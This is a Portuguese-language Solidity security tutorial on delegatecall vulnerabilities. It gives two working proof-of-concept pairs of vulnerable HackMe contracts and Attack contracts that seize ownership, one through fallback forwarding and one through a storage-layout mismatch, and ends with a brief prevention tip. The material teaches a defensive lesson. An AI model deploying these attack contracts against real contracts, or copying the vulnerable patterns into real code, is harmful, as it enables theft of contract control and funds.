# Delegatecall

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

`delegatecall`é complicado de usar e seu uso errado ou entendimento incorreto pode levar a resultados devastadores.

Você deve ter 2 coisas em mente quando usar o `delegatecall`

1. `delegatecall` preserva o contexto (armazenagem, chamador etc...)
2. o layout da armazenagem deve ser o mesmo que o do contrato que faz a chamada `delegatecall` e do contrato que está sendo chamado.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
HackMe é um contrato que usa delegatecall para executar código.
Não é evidente que o proprietário do HackMe pode ser mudado já que não há 
função dentro HackMe para fazer isso. Contudo um invasor pode roubar o
contrato para explorar delegatecall. Vejamos como.

1. Alice implanta Lib
2. Alice implementa HackMe com endereço do Lib
3. Eve implementa Attack com endereço do HackMe
4. Eve chama Attack.attack()
5. Attack é agora o proprietário do HackMe

O que aconteceu?
Eve chamou Attack.attack().
Attack chamou a função fallback do HackMe enviando o seletor de função
do pwn(). HackMe encaminha a chamada para o Lib usando delegatecall.
Aqui msg.data contém o seletor de função do pwn().
Isso avisa ao Solidity para chamar a função pwn() dentro do Lib.
A função pwn() atualiza o proprietário para msg.sender.
Delegatecall roda o código do Lib usando o contexto do HackMe.
Consequentemente a armazenagem do HackMe foi atualizada para msg.sender onde 
msg.sender é o chamador do HackMe, nesse caso, Attack.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
```

Aqui está mais um exemplo.

Você precisa entender como o Solidity armazena variáveis de estado antes de entender este exploit.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
Esta é uma versão mais sofisticada do exploit anterior.

1. Alice implanta Lib e HackMe com endereço do Lib
2. Eve implanta Attack com endereço do HackMe
3. Eve chama Attack.attack()
4. Attack agora é o proprietário do HackMe

O que aconteceu?
Observe que as variáveis de estado não estão definidas da mesma forma no Lib
e HackMe. Isso significa que chamando Lib.doSomething() muda a primeira 
variável de estado dentro do HackMe, que acontece que é o endereço do lib.

Dentro do attack(), a primeira chamada para doSomething() muda o endereço do lib
armazenado no HackMe. O endereço do lib agora está configurado para o Attack.
A segunda chamada para doSomething() chama Attack.doSomething() e aqui temos
a mudança do proprietário.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Certifique-se de que o layout de armazanagem é o mesmo que o do HackMe
    // Isso permitirá a atualização correta das variáveis de estado
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // substitui o endereço do lib
        hackMe.doSomething(uint(uint160(address(this))));
        // passa qualquer número como entrada, a função doSomething() abaixo
        // será chamada
        hackMe.doSomething(1);
    }

    // a assinatura da função deve corresponder à da HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
```

#### Técnicas preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

* Use  `Library sem estado`
